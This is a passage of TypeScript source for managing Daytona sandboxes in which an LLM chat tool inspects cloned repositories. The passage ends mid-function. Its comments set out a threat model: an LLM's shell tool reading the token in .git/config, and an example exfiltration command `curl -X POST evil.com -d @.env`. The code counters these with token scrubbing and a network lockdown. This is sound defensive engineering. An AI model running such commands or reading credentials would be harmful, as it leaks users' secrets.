"use node";

import {
  CodeLanguage,
  Daytona,
  DaytonaError,
  DaytonaNotFoundError,
  DaytonaTimeoutError,
  type Sandbox,
} from "@daytona/sdk";
import type { SandboxFsClient, SandboxShellOutcome } from "./chat/sandboxTools";
import { shouldReadFile, type RepositorySnapshot } from "./lib/repoAnalysis";
import { buildSandboxName } from "./lib/sandboxNames";
import { logInfo, logWarn } from "./lib/observability";
import { LIVE_SOURCE_UNAVAILABLE_MESSAGE } from "./lib/sandboxLiveness";
import {
  DEFAULT_AUTO_STOP_MINUTES,
  DEFAULT_AUTO_ARCHIVE_MINUTES,
  DEFAULT_AUTO_DELETE_MINUTES,
  MAX_LISTED_FILES,
  MAX_TREE_DEPTH,
} from "./lib/constants";

/**
 * Truthy parse table shared with `convex/lib/sandboxFeatureFlag.ts` —
 * keeping the same set across env-var booleans so an operator who sets
 * `SANDBOX_MODE_ENABLED=on` can use the same value for
 * `DAYTONA_POST_CLONE_BLOCK_NETWORK`. Anything outside this set
 * (including unset and the empty string) is treated as truthy ONLY
 * via the explicit default in the resolver, never via `Boolean(value)`.
 */
const TRUTHY_ENV_VALUES = new Set(["true", "1", "yes", "on"]);
const FALSY_ENV_VALUES = new Set(["false", "0", "no", "off"]);

const DEFAULT_CPU_LIMIT = 2;
const DEFAULT_MEMORY_GIB = 4;
const DEFAULT_DISK_GIB = 10;

type CreateSandboxOptions = {
  repositoryKey: string;
  repositoryId: string;
  sandboxId: string;
  accessMode: "public" | "private";
  sourceAdapter: "git_clone" | "source_service";
};

export type SandboxProvisionResult = {
  remoteId: string;
  workDir: string;
  repoPath: string;
  cpuLimit: number;
  memoryLimitGiB: number;
  diskLimitGiB: number;
  autoStopIntervalMinutes: number;
  autoArchiveIntervalMinutes: number;
  autoDeleteIntervalMinutes: number;
  networkBlockAll: boolean;
  networkAllowList?: string;
};

export type ListedSandbox = {
  remoteId: string;
  labels: Record<string, string>;
  createdAt?: string;
};

type RemoteSandboxState = "started" | "stopped" | "archived" | "destroyed" | "error" | "unknown";
export const SYSTIFY_DAYTONA_MANAGED_LABELS = {
  app: "systify",
} as const;

export type RemoteSandboxDetails =
  | {
      exists: true;
      remoteId: string;
      organizationId?: string;
      createdAt?: string;
      updatedAt?: string;
      labels: Record<string, string>;
      state: RemoteSandboxState;
    }
  | {
      exists: false;
      remoteId: string;
      state: "destroyed";
      errorKind: "not_found";
    };

export async function provisionSandbox(options: CreateSandboxOptions): Promise<SandboxProvisionResult> {
  const daytona = createDaytonaClient();
  const sandboxName = buildSandboxName({
    repositoryKey: options.repositoryKey,
    repositoryId: options.repositoryId,
    sandboxId: options.sandboxId,
  });

  // Sandbox names are import-scoped by the Convex sandbox row id. A same-name
  // lookup can only refer to a prior provisioning attempt for this sandbox row,
  // not the previous published sandbox for the repository.
  try {
    const existing = await daytona.get(sandboxName);
    await daytona.delete(existing);
    console.log(`[daytona] Deleted pre-existing sandbox: ${sandboxName}`);
  } catch {
    // Sandbox doesn't exist on Daytona — no cleanup needed
  }

  const networkAllowList = resolveNetworkAllowList();
  const cpuLimit = readNumberEnv("DAYTONA_CPU_LIMIT", DEFAULT_CPU_LIMIT);
  const memoryLimitGiB = readNumberEnv("DAYTONA_MEMORY_GIB", DEFAULT_MEMORY_GIB);
  const diskLimitGiB = readNumberEnv("DAYTONA_DISK_GIB", DEFAULT_DISK_GIB);
  const sandbox = await daytona.create({
    name: sandboxName,
    language: CodeLanguage.TYPESCRIPT,
    labels: {
      ...SYSTIFY_DAYTONA_MANAGED_LABELS,
      access: options.accessMode,
      adapter: options.sourceAdapter,
      repositoryId: options.repositoryId,
    },
    autoStopInterval: readNumberEnv("DAYTONA_AUTO_STOP_MINUTES", DEFAULT_AUTO_STOP_MINUTES),
    autoArchiveInterval: readNumberEnv("DAYTONA_AUTO_ARCHIVE_MINUTES", DEFAULT_AUTO_ARCHIVE_MINUTES),
    autoDeleteInterval: readNumberEnv("DAYTONA_AUTO_DELETE_MINUTES", DEFAULT_AUTO_DELETE_MINUTES),
    networkBlockAll: false,
    networkAllowList,
  });

  const workDir = (await sandbox.getWorkDir()) ?? "workspace";
  return {
    remoteId: sandbox.id,
    workDir,
    repoPath: `${workDir}/repo`,
    cpuLimit,
    memoryLimitGiB,
    diskLimitGiB,
    autoStopIntervalMinutes: sandbox.autoStopInterval ?? DEFAULT_AUTO_STOP_MINUTES,
    autoArchiveIntervalMinutes: sandbox.autoArchiveInterval ?? DEFAULT_AUTO_ARCHIVE_MINUTES,
    autoDeleteIntervalMinutes: sandbox.autoDeleteInterval ?? DEFAULT_AUTO_DELETE_MINUTES,
    networkBlockAll: sandbox.networkBlockAll ?? false,
    networkAllowList: sandbox.networkAllowList ?? undefined,
  };
}

export async function deleteSandbox(remoteId: string) {
  try {
    const sandbox = await getSandbox(remoteId);
    await sandbox.delete();
  } catch (error) {
    if (isDaytonaNotFoundError(error)) {
      logInfo("daytona", "delete_sandbox_already_gone", { remoteId });
      return;
    }
    throw error;
  }
}

export async function listSandboxesByLabel(labels: Record<string, string>): Promise<ListedSandbox[]> {
  const daytona = createDaytonaClient();
  const sandboxes: ListedSandbox[] = [];
  let page = 1;
  let totalPages = 1;

  while (page <= totalPages) {
    const result = await daytona.list(labels, page, 100);
    sandboxes.push(
      ...result.items.map((sandbox) => ({
        remoteId: sandbox.id,
        labels: sandbox.labels,
        createdAt: sandbox.createdAt,
      })),
    );
    totalPages = result.totalPages;
    page += 1;
  }

  return sandboxes;
}

/**
 * Stops a running sandbox to release CPU and memory resources.
 * The sandbox remains on disk and can be auto-woken by any subsequent
 * SDK interaction (e.g., `process.executeCommand`).
 */
export async function stopSandbox(remoteId: string) {
  const sandbox = await getSandbox(remoteId);
  await sandbox.stop(60);
}

/**
 * Wakes a stopped sandbox back up. `sandbox.start` is the explicit
 * counterpart to `stopSandbox` — it brings the Daytona-side runtime back
 * online without reprovisioning, which is the fast path
 * (~10–30s vs. 60–120s for a fresh provision) when the sandbox row is
 * still intact but Daytona auto-stopped it on idle.
 *
 * Callers must have already verified that the sandbox exists on Daytona
 * (see `probeLiveSandbox`); calling `start` on a destroyed sandbox throws.
 */
export async function startSandbox(remoteId: string) {
  const sandbox = await getSandbox(remoteId);
  await sandbox.start(60);
}

/**
 * Returns the current Daytona-side state of a sandbox.
 * Useful for syncing Convex DB status with reality.
 */
export async function getSandboxState(remoteId: string): Promise<RemoteSandboxState> {
  try {
    const sandbox = await getSandbox(remoteId);
    await sandbox.refreshData();
    return normalizeRemoteSandboxState(sandbox.state);
  } catch (error) {
    if (!isDaytonaNotFoundError(error)) {
      throw error;
    }

    return "destroyed";
  }
}

/**
 * Reason codes returned by `probeLiveSandbox` when Daytona reports a state
 * that means "this sandbox is not usable right now". `deleted` covers the
 * 404 case (Daytona returned `not_found` from `get` — typically a manual
 * deletion in the dashboard, or Daytona-side GC after the archive TTL).
 */
export type LiveSandboxUnavailableReason = "deleted" | "archived" | "stopped" | "error" | "unknown";

export type LiveSandboxProbe =
  | { ok: true; remoteState: RemoteSandboxState }
  | {
      ok: false;
      remoteState: RemoteSandboxState;
      reason: LiveSandboxUnavailableReason;
      message: string;
    };

/**
 * Authoritative liveness check for a Daytona sandbox. Pure: no Convex
 * writes, just translates `getRemoteSandboxDetails` into a verdict the
 * caller can act on.
 *
 * Used as the first step of any action that is about to spend tokens or
 * compute on a sandbox so the local `sandboxes` cache is never load-bearing
 * for the "can we actually use this?" decision — Daytona is. See
 * `convex/lib/sandboxLiveness.ts` for the action-side wrapper that also
 * mirrors the result back into Convex.
 */
export async function probeLiveSandbox(remoteId: string): Promise<LiveSandboxProbe> {
  const details = await getRemoteSandboxDetails(remoteId);
  if (!details.exists) {
    return {
      ok: false,
      remoteState: "destroyed",
      reason: "deleted",
      message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
    };
  }
  switch (details.state) {
    case "started":
      return { ok: true, remoteState: "started" };
    case "archived":
      return {
        ok: false,
        remoteState: "archived",
        reason: "archived",
        message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
      };
    case "stopped":
      return {
        ok: false,
        remoteState: "stopped",
        reason: "stopped",
        message: "Live access to the repository wasn't available. The next attempt will wake it up.",
      };
    case "destroyed":
      return {
        ok: false,
        remoteState: "destroyed",
        reason: "deleted",
        message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
      };
    case "error":
      return {
        ok: false,
        remoteState: "error",
        reason: "error",
        message: "Live access to the repository hit an error. Try again in a minute.",
      };
    case "unknown":
      return {
        ok: false,
        remoteState: "unknown",
        reason: "unknown",
        message: "Live access state is unknown. Try again if the problem persists.",
      };
  }
}

export async function getRemoteSandboxDetails(remoteId: string): Promise<RemoteSandboxDetails> {
  try {
    const sandbox = await getSandbox(remoteId);
    await sandbox.refreshData();

    return {
      exists: true,
      remoteId: sandbox.id,
      organizationId: sandbox.organizationId,
      createdAt: sandbox.createdAt,
      updatedAt: sandbox.updatedAt,
      labels: sandbox.labels ?? {},
      state: normalizeRemoteSandboxState(sandbox.state),
    };
  } catch (error) {
    if (!isDaytonaNotFoundError(error)) {
      throw error;
    }

    return {
      exists: false,
      remoteId,
      state: "destroyed",
      errorKind: "not_found",
    };
  }
}

export async function cloneRepositoryInSandbox(args: {
  remoteId: string;
  url: string;
  branch?: string;
  token?: string;
}) {
  const sandbox = await getSandbox(args.remoteId);
  try {
    await sandbox.git.clone(
      args.url,
      "repo",
      args.branch,
      undefined,
      args.token ? "x-access-token" : undefined,
      args.token,
    );
  } catch (error) {
    throw wrapDaytonaCloneError(error, {
      url: args.url,
      branch: args.branch,
      hasToken: Boolean(args.token),
    });
  }

  // Plan 05 — Token scrub. `sandbox.git.clone` with credentials embeds
  // the token into `.git/config` (`https://x-access-token:<token>@…`).
  // Without this overwrite, Plan 08's `run_shell` would let the LLM
  // `cat .git/config` and exfiltrate the token into `messages`, which
  // sandbox deletion does NOT scrub. See
  // `docs/sandbox-mode-security-system-design.md`.
  //
  // Unconditional (not gated on `SANDBOX_MODE_ENABLED`): the leak is
  // created by the clone, not by the chat layer, so this is hardening
  // rather than feature behavior. The `args.url` substitution is
  // POSIX-single-quoted for defense in depth — `importsNode.ts` only
  // ever passes canonical HTTPS URLs today, but a less-sanitized
  // future caller must not break out of the command.
  //
  // Subsequent `git fetch` inside the sandbox will fail without re-auth,
  // which is the desired posture for a read-only analysis sandbox.
  await sandbox.process.executeCommand(`git remote set-url origin ${posixSingleQuote(args.url)}`, "repo");

  // Post-clone network lockdown. Once the source is on disk, Systify never
  // needs sandbox-side egress: the LLM's `run_shell` is intended to be
  // read-only by prompt + deny list, and every legitimate operation
  // (read_file, list_dir, executeCommand) is dispatched through Daytona's
  // control plane — which is independent of the sandbox container's
  // outbound traffic. Cutting outbound here is the load-bearing block on
  // data exfiltration: a chat reply that smuggles
  // `curl -X POST evil.com -d @.env` past the deny list will fail at the
  // network layer instead of completing the leak.
  //
  // Daytona applies the iptables rule to a running sandbox via
  // `updateNetworkSettings`. This project pins `@daytona/sdk` at `0.173.0` to
  // pick up later fixes/features required by this PR. The call is gated by
  // Daytona organization tier — Tier 1/2 cannot override sandbox-level
  // network policy and the SDK call throws.
  //
  // The block is therefore env-var-gated:
  //   - `DAYTONA_POST_CLONE_BLOCK_NETWORK` truthy (default) → call the SDK,
  //     fail-closed if it rejects. The right posture for Tier 3+ orgs and
  //     for operators who want network-layer enforcement of egress.
  //   - falsy → skip the call entirely and emit a structured warn so
  //     operators see the degraded posture in logs. The right posture for
  //     Tier 1/2 orgs (where the SDK call is unavailable) and for dev
  //     deployments that accept the application-layer mitigations
  //     (system prompt, deny list, output redaction, throwaway lifecycle)
  //     as sufficient. See `docs/sandbox-mode-security-system-design.md`
  //     for the full posture analysis.
  if (resolvePostCloneBlockNetwork()) {
    await sandbox.updateNetworkSettings({ networkBlockAll: true });
  } else {
    logWarn("daytona", "post_clone_network_block_skipped", {
      remoteId: args.remoteId,
      reason:
        "DAYTONA_POST_CLONE_BLOCK_NETWORK is disabled — sandbox egress is not blocked at the network layer. " +
        "Defenses fall back to system prompt, deny list, output redaction, and throwaway lifecycle.",
    });
  }

  // Branch and SHA are independent reads, so issue them in parallel —
  // each is a separate Daytona round trip, sequencing them doubles the
  // post-clone latency for no benefit. The scrub above stays sequential
  // because its ordering (before any other post-clone command) is the
  // security invariant pinned by `daytona.test.ts`. The network block runs
  // between scrub and inspection so that, by the time any tool layer can
  // observe the sandbox, both the on-disk token leak and the egress path
  // are already closed; branch/SHA reads ride Daytona's control plane and
  // are not affected by the outbound iptables rule.
  const [branchCommand, shaCommand] = await Promise.all([
    sandbox.process.executeCommand("git branch --show-current", "repo"),
    sandbox.process.executeCommand("git rev-parse HEAD", "repo"),
  ]);

  return {
    branch: branchCommand.result.trim() || args.branch,
    commitSha: shaCommand.result.trim(),
  };
}

/**
 * POSIX-shell single-quote escaping for safe `'…'` substitution into a
 * shell command. Embedded single quotes are escaped by closing the quote,
 * inserting a literal `\\'`, and reopening — the canonical pattern from
 * `man sh` that works under every POSIX shell Daytona could plausibly use
 * (bash, dash, ash, zsh).
 *
 * Used here only for the `origin` URL post-clone rewrite. Callers that
 * need to escape *arguments* should remember that this is full quoting,
 * not escaping — joining multiple quoted segments with spaces still
 * produces a well-formed argv.
 */
function posixSingleQuote(value: string): string {
  return `'${value.replace(/'/g, "'\\''")}'`;
}

/**
 * Enrich a `sandbox.git.clone` failure with the diagnostic context the
 * Daytona SDK strips out by default.
 *
 * The Daytona toolbox surfaces clone failures as `DaytonaError` subclasses
 * whose `message` is often the bare axios default ("Request failed with
 * status code 400") — because the toolbox returns an empty body for most
 * validation failures and the SDK's `extractAxiosErrorMessage` falls
 * through to `error.message`. Without the status code, the SDK error
 * code, and which repo / branch / auth posture failed, post-mortem turns
 * into guesswork.
 *
 * The wrapper embeds the relevant fields in its own `message` so they
 * propagate to BOTH the Convex log (via `logErrorWithId` → `serializeError`)
 * AND the import record's `errorMessage` column (which the UI renders to
 * the user). The original error is forwarded via `cause` so observability
 * walks the chain and surfaces `statusCode` / `errorCode` as structured
 * fields too. The original `name` is preserved so log filters and dashboards
 * keyed on `DaytonaValidationError` keep matching.
 *
 * Security invariants:
 *   - The token itself is NEVER part of the wrapped message — only a
 *     boolean indicating whether one was supplied. Even though the
 *     wrapper runs inside the Convex backend, the resulting message
 *     lands in `imports.errorMessage` and is rendered to the user, so
 *     the audit posture is "no credentials leave this function".
 *   - Only the URL's host is embedded — never the full URL, which could
 *     include a `userinfo` component (e.g. `https://user:pass@host/...`)
 *     if a future caller pre-bakes credentials into the URL.
 */
function wrapDaytonaCloneError(error: unknown, context: { url: string; branch?: string; hasToken: boolean }): Error {
  const urlHost = safeUrlHost(context.url);
  const branchDescriptor = context.branch ?? "(default)";
  const authDescriptor = context.hasToken ? "with installation token" : "without auth";

  const fragments: string[] = [
    `Sandbox git clone failed (host=${urlHost}, branch=${branchDescriptor}, ${authDescriptor})`,
  ];

  if (error instanceof DaytonaError) {
    if (error.statusCode !== undefined) {
      fragments.push(`Daytona HTTP ${error.statusCode}`);
    }
    if (error.errorCode) {
      fragments.push(`code=${error.errorCode}`);
    }
    fragments.push(error.message);
  } else if (error instanceof Error) {
    fragments.push(error.message);
  } else {
    fragments.push(String(error));
  }

  // `new Error(msg, { cause })` is ES2022; the frontend tsconfig still ships
  // an ES2020 `lib` so we attach `cause` as a property after construction.
  // The runtime semantics are identical — V8's two-arg `Error` constructor
  // is sugar for the same property assignment — and `serializeError` reads
  // `cause` through the same localised cast.
  const wrapped = new Error(fragments.join(" — ")) as Error & { cause?: unknown };
  wrapped.cause = error;
  if (error instanceof Error) {
    // Forward the original name so log filters / dashboards that key on
    // `DaytonaValidationError` keep matching after wrapping. We only do
    // this for `Error` subclasses — a string `cause` would leave `name`
    // as the default "Error", which is the right fallback.
    wrapped.name = error.name;
  }
  return wrapped;
}

/**
 * Extract the host of a URL without throwing on malformed input. The
 * `WHATWG URL` parser accepts every URL the import pipeline produces
 * today, but the helper is on the error path where any second exception
 * would mask the original failure — so the fallback is preferred over a
 * panic.
 */
function safeUrlHost(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return "(unparseable url)";
  }
}

/**
 * Try to read a project manifest, returning `undefined` if the file does not
 * exist on disk. The distinction between "missing" (`undefined`) and "empty"
 * (`""`) is part of the `RepositorySnapshot` contract: downstream consumers
 * (system design, artifact synthesis, prompt building) treat them as
 * different signals — "this repo has no package.json at all" vs "package.json
 * exists but is intentionally empty". Collapsing both into `""` would break
 * "is this a JS/Python/Rust project?" inference at the source.
 *
 * Any thrown error from Daytona (404, network, malformed response) is
 * normalised to `undefined`. Differentiating "404" from "network error" here
 * would require importing Daytona-specific symbols and is out of scope —
 * the snapshot pass is best-effort and a transient miss simply means the
 * model gets fewer signals on this provisioning, not a fatal failure.
 */
async function fetchManifest(sandbox: Sandbox, path: string): Promise<string | undefined> {
  try {
    return await downloadUtf8File(sandbox, path);
  } catch {
    return undefined;
  }
}

export async function collectRepositorySnapshot(remoteId: string, repoPath: string): Promise<RepositorySnapshot> {
  const sandbox = await getSandbox(remoteId);
  const listed = await walkRepositoryTree(sandbox, repoPath);
  const readmePath = listed.find(
    (entry) => entry.fileType === "file" && /(^|\/)readme(\.[^.]+)?$/i.test(entry.path),
  )?.path;

  const importantFiles = listed
    .filter((entry) => entry.fileType === "file" && shouldReadFile(entry.path))
    .sort((left, right) => Number(right.path.includes("README")) - Number(left.path.includes("README")))
    .slice(0, 12);

  // Single fan-out for every disk read in the snapshot pass — manifests +
  // readme + importantFiles all dispatch concurrently as one Promise.all.
  // The previous incarnation (1) re-downloaded a manifest twice if it
  // happened to land in `importantFiles.slice(0, 12)`, and (2) skipped the
  // manifest entirely if it didn't. Manifests are *always* worth attempting
  // because they are the primary signal for "what stack is this repo?";
  // crowd-out by less-relevant important files lost that signal.
  //
  // Note: `Promise.all` itself does *not* cap upstream concurrency (the
  // burst here is at most three manifests + a readme + 12 important files
  // = 16 concurrent downloads). If `MAX_LISTED_FILES` ever grows to a
  // point where 12 important files becomes too many, replace this with a
  // bounded-concurrency pool — same pattern as `walkRepositoryTree`.
  const [packageJsonContent, pyprojectContent, cargoTomlContent, readmeContent, importantFileContents] =
    await Promise.all([
      fetchManifest(sandbox, `${repoPath}/package.json`),
      fetchManifest(sandbox, `${repoPath}/pyproject.toml`),
      fetchManifest(sandbox, `${repoPath}/Cargo.toml`),
      readmePath ? downloadUtf8File(sandbox, `${repoPath}/${readmePath}`) : Promise.resolve(undefined),
      Promise.all(
        importantFiles.map(async (file) => ({
          path: file.path,
          content: await downloadUtf8File(sandbox, `${repoPath}/${file.path}`),
        })),
      ),
    ]);

  return {
    readmePath,
    readmeContent,
    packageJsonContent,
    pyprojectContent,
    cargoTomlContent,
    // We do not filter empty `importantFileContents` — a legitimately-empty
    // source file is still a signal that the file exists at that path.
    // Downstream consumers that want to ignore empty content should do so
    // explicitly so the choice is auditable.
    importantFileContents,
    files: listed,
  };
}

export async function runFocusedInspection(remoteId: string, repoPath: string, prompt: string) {
  const sandbox = await getSandbox(remoteId);
  const inspectionCommand = `
python3 - <<'PY'
import json, os, re

repo_path = os.environ["REPO_PATH"]
prompt = os.environ["ANALYSIS_PROMPT"]
terms = [token for token in re.findall(r"[A-Za-z0-9_]+", prompt.lower()) if len(token) > 2][:8]
matches = []
for root, dirs, files in os.walk(repo_path):
    dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "dist", "build", ".next", ".turbo"}]
    rel_root = os.path.relpath(root, repo_path)
    for name in files:
        rel_path = name if rel_root == "." else os.path.join(rel_root, name)
        score = sum(1 for term in terms if term in rel_path.lower())
        if score:
            matches.append((score, rel_path))
matches.sort(key=lambda item: (-item[0], item[1]))
print(json.dumps({
    "terms": terms,
    "matchingFiles": [path for _, path in matches[:20]]
}))
PY`;

  const result = await sandbox.process.executeCommand(
    inspectionCommand,
    undefined,
    {
      REPO_PATH: repoPath,
      ANALYSIS_PROMPT: prompt,
    },
    60,
  );

  return result.result.trim();
}

/**
 * Validates every env var required to provision a Daytona sandbox. Call this
 * at the entry point of any action that will provision a sandbox so the
 * operator gets a single, actionable error before any Convex/Daytona side
 * effects (sandbox row reservation, GitHub permission probe, etc.) occur.
 *
 * The deeper layer (`provisionSandbox` → `resolveNetworkAllowList`) repeats
 * the allow-list check as defense in depth: if a future caller forgets the
 * fail-fast assertion, the inner layer still refuses to provision rather
 * than silently shipping a sandbox without an explicit network posture.
 */
export function assertSandboxProvisioningConfigured(): void {
  if (!process.env.DAYTONA_API_KEY) {
    throw new Error("DAYTONA_API_KEY env var is not set. Add Daytona credentials before importing repositories.");
  }
  resolveNetworkAllowList();
}

/**
 * Resolves whether `cloneRepositoryInSandbox` should call
 * `sandbox.updateNetworkSettings({ networkBlockAll: true })` after a
 * successful clone. The flag exists because the underlying SDK call is
 * gated by Daytona organization tier — Tier 1/2 cannot override
 * sandbox-level network policy and the call is rejected at the API layer.
 *
 * Contract:
 *   - Unset / unrecognised value → `true` (secure default; if the
 *     deployment is on Tier 3+ it gets the network-layer block; if it
 *     is on Tier 1/2 the SDK call surfaces the error and the import
 *     fails-closed, which is the loudest signal that the operator must
 *     consciously configure this flag).
 *   - Truthy (`true` / `1` / `yes` / `on`, case-insensitive) → call
 *     the SDK; fail-closed on rejection.
 *   - Falsy (`false` / `0` / `no` / `off`, case-insensitive) → skip the
 *     call and emit a structured `post_clone_network_block_skipped`
 *     warning so operators see the degraded posture in logs.
 *
 * The fall-back posture (when this flag is `false`) is documented in
 * `docs/sandbox-mode-security-system-design.md`: the application layer
 * (system prompt, `COMMAND_DENY_LIST`, `redact()`, throwaway lifecycle,
 * unprivileged execution) becomes the sole defense against egress-based
 * exfiltration. That is acceptable for Tier 1/2 dev deployments only;
 * operators offering the service to third parties should plan to upgrade
 * tier and re-enable the block.
 */
function resolvePostCloneBlockNetwork(): boolean {
  const raw = process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
  if (raw === undefined) {
    return true;
  }
  const normalized = raw.trim().toLowerCase();
  if (FALSY_ENV_VALUES.has(normalized)) {
    return false;
  }
  if (TRUTHY_ENV_VALUES.has(normalized)) {
    return true;
  }
  // Unrecognised value → secure default. Mirrors the
  // `parseRolloutPercent` "invalid → fail closed to 0" pattern used in
  // `sandboxRollout.ts`: a typo in env config should never silently
  // disable a security control.
  return true;
}

/**
 * Resolves the Daytona network allow list from env, distinguishing two
 * intents that the previous "truthy / falsy" check collapsed:
 *
 *   - `undefined` (env var never configured) → operator has not made a
 *     choice. We fail-closed because shipping a sandbox without a
 *     considered network posture is a security regression.
 *   - `""` / whitespace (env var present but explicitly empty) → operator
 *     has opted in to Daytona's default network policy. This is the
 *     documented dev posture (see `docs/sandbox-mode-system-design.md`).
 *     We pass `undefined` to the Daytona SDK so its server-side default
 *     applies.
 *   - Non-empty → explicit allow list of IPv4 CIDR ranges. Validated and
 *     forwarded to Daytona.
 */
function resolveNetworkAllowList(): string | undefined {
  const raw = process.env.DAYTONA_NETWORK_ALLOW_LIST;
  if (raw === undefined) {
    throw new Error(
      "DAYTONA_NETWORK_ALLOW_LIST env var is not set. " +
        'Set it to a comma-separated list of IPv4 CIDR ranges (e.g. "140.82.112.0/20") ' +
        'for production, or to an empty string ("") to opt in to the Daytona default ' +
        "network policy. See docs/sandbox-mode-system-design.md. " +
        "Note: Daytona rejects domain:port values such as `github.com:443` — the field is parsed as CIDR.",
    );
  }
  const trimmed = raw.trim();
  if (trimmed === "") {
    return undefined;
  }

  // Validate CIDR format: comma-separated list of IPv4 CIDR ranges
  const cidrPattern = /^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$/;
  const entries = trimmed.split(",").map((e) => e.trim());
  const invalid = entries.filter((e) => !cidrPattern.test(e));

  if (invalid.length > 0) {
    throw new Error(
      `Invalid CIDR entries in DAYTONA_NETWORK_ALLOW_LIST: ${invalid.join(", ")}. ` +
        "Each entry must be an IPv4 CIDR range (e.g. 140.82.112.0/20, 192.168.0.0/16).",
    );
  }

  return trimmed;
}

/**
 * Plan-04 + Plan-08 adapter — wraps a Daytona `Sandbox` in the runtime-
 * agnostic `SandboxFsClient` interface that `chat/sandboxTools.ts` consumes.
 *
 * Why this lives in `daytona.ts` rather than `chat/sandboxTools.ts`:
 *
 *   - All Daytona-specific code (Node-only imports, error types, SDK quirks)
 *     stays here. `sandboxTools.ts` remains runtime-agnostic and trivially
 *     unit-testable with a fake client.
 *   - The shell tool (`run_shell`, Plan 08) reuses the same handle and
 *     adapter rather than re-querying Daytona inside `chat/sandboxTools.ts`.
 *   - Type fidelity: Daytona's `downloadFile` is overloaded — one form
 *     returns `Buffer`, the other returns `void` (writes to a local path).
 *     Selecting the buffer overload here means `sandboxTools.ts` sees the
 *     narrower, single-overload `Promise<Uint8Array>` shape.
 *   - Error translation: `DaytonaTimeoutError` is folded into the
 *     `SandboxShellOutcome` discriminated union so the tool layer never
 *     imports `@daytona/sdk` symbols. Other Daytona errors (auth, 404,
 *     network) keep throwing — they are infrastructural failures the tool's
 *     generic try/catch already maps to `io_error`.
 */
export async function getSandboxFsClient(remoteId: string): Promise<SandboxFsClient> {
  const sandbox = await getSandbox(remoteId);
  return {
    // The two-arg `downloadFile(path, timeout)` overload returns a Buffer
    // (which extends Uint8Array, satisfying the SandboxFsClient contract).
    // We intentionally pin to that overload; the three-arg form would
    // download to a local file and is irrelevant here.
    downloadFile: (path, timeoutSeconds) => sandbox.fs.downloadFile(path, timeoutSeconds),
    listFiles: async (path) => {
      const entries = await sandbox.fs.listFiles(path);
      // Project Daytona's `FileInfo` (group, mode, owner, modTime, …) onto
      // the `SandboxListedFile` minimum the tool needs. This both narrows
      // the surface area we pass into the LLM (no metadata leaks) and
      // insulates the tool factory from upstream SDK schema drift.
      return entries.map((entry) => ({
        name: entry.name,
        isDir: entry.isDir,
        size: entry.size,
      }));
    },
    // Plan 08 — `run_shell` adapter. Daytona's `executeCommand` returns
    // `{ exitCode, result }` for normal completion (including non-zero
    // exits — `grep` finding nothing exits 1 without throwing). Timeouts
    // surface as `DaytonaTimeoutError`; we translate that into a
    // `kind: "timeout"` outcome so the tool layer can build a
    // `command_timeout` envelope without importing the SDK error type.
    //
    // Other Daytona errors (auth, 404, network) keep throwing — the tool
    // layer's generic try/catch turns them into `io_error`. We do *not*
    // catch them here because that would make the adapter swallow
    // genuinely-infrastructural failures behind a "timeout" badge.
    executeCommand: async (command, options): Promise<SandboxShellOutcome> => {
      try {
        const response = await sandbox.process.executeCommand(
          command,
          options.cwd,
          options.env,
          options.timeoutSeconds,
        );
        return {
          kind: "ok",
          exitCode: response.exitCode,
          // `response.result` is the merged stdout/stderr per the SDK
          // contract (`response.artifacts.stdout` is the same string).
          // The tool layer handles truncation and redaction — we forward
          // the raw output here.
          output: response.result,
        };
      } catch (error) {
        if (error instanceof DaytonaTimeoutError) {
          return { kind: "timeout", message: error.message };
        }
        throw error;
      }
    },
  };
}

export function isSystifyManagedSandbox(labels: Record<string, string> | undefined): boolean {
  if (!labels) {
    return false;
  }
  return labels.app === SYSTIFY_DAYTONA_MANAGED_LABELS.app;
}

/**
 * Bounded-concurrency repository walker.
 *
 * The previous implementation tried to parallelize a recursive DFS by
 * pushing each subdirectory's `walkRepositoryTree(...)` promise into a
 * shared array and `Promise.all`-ing them. That was a real concurrency
 * hazard for two reasons:
 *
 *   1. **Shared-array race.** Every parallel walk pushed into the same
 *      `acc` and independently checked `acc.length >= MAX_LISTED_FILES`.
 *      With N concurrent walks, all N could read `acc.length` below the
 *      cap at the same instant and proceed to push, blowing past
 *      MAX_LISTED_FILES by an unbounded margin. Sequential `await` was
 *      what made the cap actually mean something.
 *
 *   2. **Daytona burst.** A repo with 50 first-level subdirectories would
 *      issue 50 concurrent `listFiles` calls; the SDK has no internal
 *      rate limit, so this lands as a thundering herd on the Daytona API
 *      that can trigger throttling or fail individual calls.
 *
 * The fix here is **bounded BFS**:
 *
 *   - **Concurrency cap (`WALK_CONCURRENCY = 8`)**: each round dispatches at
 *     most 8 `listFiles` calls in parallel. A typical repo has well under
 *     200 directories and finishes in 2–3 rounds, going from a sequential
 *     ~5 s to ~600 ms — fast enough that sandbox provisioning UX isn't
 *     blocked, gentle enough that Daytona doesn't see a spike.
 *
 *   - **Single-writer merge phase**: after each round's `Promise.all`
 *     resolves, the synchronous merge loop is the only writer to `acc`,
 *     so the `acc.length >= MAX_LISTED_FILES` cap holds *strictly* (no
 *     overshoot). This is the key correctness property the old code lost.
 *
 *   - **Deterministic order via binary code-point sort**: each listing is
 *     sorted by name *before* merging into `acc`. Daytona's listFiles does
 *     not guarantee an order, and `localeCompare` is locale-dependent —
 *     binary comparison is stable across runtimes, matching the convention
 *     `sandboxTools.ts` already uses for `list_dir`.
 *
 *   - **BFS visit order**: the previous DFS recursed into each subdir
 *     before continuing siblings. Switching to BFS means depth-0 files
 *     appear in `acc` before depth-1 files. This is *better* for the
 *     downstream consumers — `readmePath` resolves to the root README
 *     deterministically rather than to whichever subdirectory's README
 *     happened to be visited first by the DFS recursion.
 */
const WALK_CONCURRENCY = 8;

async function walkRepositoryTree(sandbox: Sandbox, repoPath: string): Promise<RepositorySnapshot["files"]> {
  const acc: RepositorySnapshot["files"] = [];
  const frontier: Array<{ relativePath: string; depth: number }> = [{ relativePath: "", depth: 0 }];

  while (frontier.length > 0 && acc.length < MAX_LISTED_FILES) {
    const batch = frontier.splice(0, WALK_CONCURRENCY);

    // I/O fan-out — at most WALK_CONCURRENCY listFiles in flight at once.
    // Depth-exceeded entries return an empty listing rather than skipping
    // the batch slot; this keeps the merge loop's iteration count fixed
    // and avoids a separate filter step.
    const listings = await Promise.all(
      batch.map(async ({ relativePath, depth }) => {
